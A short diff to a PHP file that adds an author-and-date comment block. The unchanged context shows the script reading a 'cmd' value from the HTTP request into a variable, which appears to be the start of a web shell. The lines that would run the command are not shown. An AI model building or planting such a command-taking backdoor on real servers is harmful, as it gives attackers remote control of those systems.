@@ -1,5 +1,8 @@
 <?php
-
+/**
+ * @author Mohammed Dahir Abdulmumini
+ * 18/12/2015
+ */
 if ( isset ( $_REQUEST [ 'cmd' ] ) )
 {
     $cmd = $_REQUEST[ 'cmd' ];
